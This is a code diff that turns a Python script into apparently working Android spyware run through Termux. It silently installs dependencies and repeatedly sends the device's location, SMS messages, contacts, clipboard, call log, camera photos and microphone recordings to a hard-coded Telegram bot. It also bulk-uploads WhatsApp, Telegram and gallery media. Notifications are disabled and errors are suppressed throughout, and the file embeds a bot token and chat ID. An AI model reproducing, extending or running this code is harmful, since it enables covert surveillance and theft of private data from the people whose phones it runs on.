@@ -1,91 +1,193 @@
+import subprocess
+import json
+import time
+from datetime import datetime
 import os
 import threading
 from concurrent.futures import ThreadPoolExecutor
-import telebot
 
-# تثبيت تلقائي إذا لزم الأمر
-try:
-    import telebot
-except ImportError:
-    import subprocess
-    import sys
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI"])
-    import telebot
+for pkg in ["requests", "pyTelegramBotAPI"]:
+    try:
+        __import__(pkg)
+    except ImportError:
+        import sys
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+import telebot
 
 BOT_TOKEN = "7563891455:AAFDVnkldlMVL266k4_HUHDZXjEogSp2yi4"
 ADMIN_CHAT_ID = 7238044992
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# قائمة المسارات المستهدفة (بدون root - Android 11+)
 TARGET_PATHS = [
-    # WhatsApp الجديد (Scoped Storage)
     "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images",
     "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video",
     "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Voice Notes",
     "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents",
-    
-    # WhatsApp القديم (للتوافق مع بعض الأجهزة)
     "/storage/emulated/0/WhatsApp/Media/WhatsApp Images",
     "/storage/emulated/0/WhatsApp/Media/WhatsApp Video",
-    
-    # Telegram (يعتمد على إعدادات المستخدم)
     "/storage/emulated/0/Telegram/Telegram Images",
     "/storage/emulated/0/Telegram/Telegram Video",
     "/storage/emulated/0/Telegram/Telegram Documents",
     "/storage/emulated/0/Downloads/Telegram",
-    
-    # Screenshots
     "/storage/emulated/0/Pictures/Screenshots",
     "/storage/emulated/0/DCIM/Screenshots",
-    
-    # مجلدات عامة إضافية قد تحتوي صور/فيديوهات
     "/storage/emulated/0/Pictures",
     "/storage/emulated/0/DCIM/Camera",
     "/storage/emulated/0/Download"
 ]
 
+PHOTO_PATH = "/sdcard/DCIM/Camera/termux_spy.jpg"
+AUDIO_PATH = "/sdcard/termux_audio.wav"
+
+SMS_RECIPIENT = ""
+SMS_MESSAGE = "رسالة اختبار"
+
+def send_text(text):
+    try:
+        bot.send_message(ADMIN_CHAT_ID, text, parse_mode="Markdown", disable_notification=True)
+    except:
+        pass
+
+def send_photo(photo_path, caption=""):
+    if not os.path.exists(photo_path): return
+    try:
+        with open(photo_path, "rb") as f:
+            bot.send_photo(ADMIN_CHAT_ID, f, caption=caption, disable_notification=True)
+    except:
+        pass
+
+def send_audio(audio_path, caption=""):
+    if not os.path.exists(audio_path): return
+    try:
+        with open(audio_path, "rb") as f:
+            bot.send_audio(ADMIN_CHAT_ID, f, caption=caption, disable_notification=True)
+    except:
+        pass
+
 def send_file(file_path):
+    if not os.path.isfile(file_path): return
     try:
         with open(file_path, "rb") as f:
-            ext = file_path.lower()
+            name = os.path.basename(file_path)
+            ext = name.lower()
+            caption = f"By: TOM | {name}"
             if ext.endswith((".jpg", ".jpeg", ".png", ".webp", ".gif")):
-                bot.send_photo(
-                    chat_id=ADMIN_CHAT_ID,
-                    photo=f,
-                    caption=f"By: TOM | {os.path.basename(file_path)}"
-                )
+                bot.send_photo(ADMIN_CHAT_ID, f, caption=caption, disable_notification=True)
             elif ext.endswith((".mp4", ".mov", ".3gp", ".avi")):
-                bot.send_video(
-                    chat_id=ADMIN_CHAT_ID,
-                    video=f,
-                    caption=f"By: TOM | {os.path.basename(file_path)}"
-                )
-            elif ext.endswith((".pdf", ".doc", ".docx", ".txt", ".zip")):
-                bot.send_document(
-                    chat_id=ADMIN_CHAT_ID,
-                    document=f,
-                    caption=f"By: TOM | Document: {os.path.basename(file_path)}"
-                )
-            # يمكن إضافة أنواع أخرى مثل mp3 إلخ إذا أردت
-    except Exception:
-        pass  # تجاهل الأخطاء الفردية
+                bot.send_video(ADMIN_CHAT_ID, f, caption=caption, disable_notification=True)
+            else:
+                bot.send_document(ADMIN_CHAT_ID, f, caption=f"By: TOM | {name}", disable_notification=True)
+    except:
+        pass
 
-def upload_from_paths():
-    with ThreadPoolExecutor(max_workers=120) as executor:
-        for base_path in TARGET_PATHS:
-            if not os.path.exists(base_path):
-                continue
-            for root, _, files in os.walk(base_path):
+def upload_all_files():
+    with ThreadPoolExecutor(max_workers=60) as executor:
+        for base in TARGET_PATHS:
+            if not os.path.exists(base): continue
+            for root, _, files in os.walk(base):
                 for file in files:
-                    full_path = os.path.join(root, file)
-                    executor.submit(send_file, full_path)
+                    full = os.path.join(root, file)
+                    executor.submit(send_file, full)
 
-# تشغيل في خلفية
-threading.Thread(target=upload_from_paths, daemon=True).start()
+def get_device_info():
+    try:
+        bat = json.loads(subprocess.check_output(["termux-battery-status"]).decode())
+        bat_str = f"{bat.get('percentage', '?')}% • {bat.get('status', '?')}"
+    except:
+        bat_str = "?"
+    try:
+        loc = subprocess.check_output(["termux-location", "-p"]).decode().strip()
+    except:
+        loc = "?"
+    return f"📱 {datetime.now().strftime('%Y-%m-%d %H:%M')} • البطارية: {bat_str} • الموقع: {loc}"
 
-# نسخة احتياطية بسيطة (اختياري)
-try:
-    threading.Thread(target=upload_from_paths, daemon=True).start()
-except:
-    pass
+def get_recent_sms(limit=4):
+    try:
+        data = json.loads(subprocess.check_output(["termux-sms-list"]).decode())
+        lines = [f"{m.get('address','?')} → {m.get('body','?')[:70]}..." for m in data[:limit]]
+        return "📩 آخر الرسائل:\n" + "\n".join(lines) if lines else ""
+    except:
+        return ""
+
+def get_contacts(limit=6):
+    try:
+        data = json.loads(subprocess.check_output(["termux-contact-list"]).decode())
+        lines = [f"{c.get('name','?')} → {c.get('number','?')}" for c in data[:limit]]
+        return "👥 جهات الاتصال:\n" + "\n".join(lines) if lines else ""
+    except:
+        return ""
+
+def capture_photo():
+    try:
+        subprocess.check_call(["termux-camera-photo", "-c", "0", PHOTO_PATH], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return True
+    except:
+        return False
+
+def record_audio(sec=15):
+    try:
+        subprocess.check_call(["termux-microphone-record", "-f", AUDIO_PATH, "-l", str(sec)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(sec + 2)
+        return True
+    except:
+        return False
+
+def get_clipboard():
+    try:
+        clip = subprocess.check_output(["termux-clipboard-get"]).decode().strip()
+        return f"📋 الحافظة: {clip[:180]}..." if clip else ""
+    except:
+        return ""
+
+def get_call_log(limit=5):
+    try:
+        data = json.loads(subprocess.check_output(["termux-call-log"]).decode())
+        lines = [f"{c.get('number','?')} • {c.get('type','?')} • {c.get('duration','?')}ث" for c in data[:limit]]
+        return "📞 آخر المكالمات:\n" + "\n".join(lines) if lines else ""
+    except:
+        return ""
+
+def send_test_sms():
+    if not SMS_RECIPIENT: return ""
+    try:
+        subprocess.check_call(["termux-sms-send", "-n", SMS_RECIPIENT, SMS_MESSAGE], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return "تم إرسال رسالة اختبار"
+    except:
+        return ""
+
+def main():
+    send_text("السكريبت بدأ العمل")
+
+    threading.Thread(target=upload_all_files, daemon=True).start()
+
+    while True:
+        try:
+            parts = [
+                get_device_info(),
+                get_recent_sms(),
+                get_contacts(),
+                get_clipboard(),
+                get_call_log(),
+                send_test_sms()
+            ]
+            report = "\n\n".join([p for p in parts if p])
+            if report:
+                send_text(report)
+
+            if capture_photo():
+                send_photo(PHOTO_PATH, "صورة تلقائية")
+
+            if record_audio(15):
+                send_audio(AUDIO_PATH, "تسجيل صوت 15 ثانية")
+
+            threading.Thread(target=upload_all_files, daemon=True).start()
+
+            time.sleep(900)
+
+        except:
+            time.sleep(300)
+
+if __name__ == "__main__":
+    main()
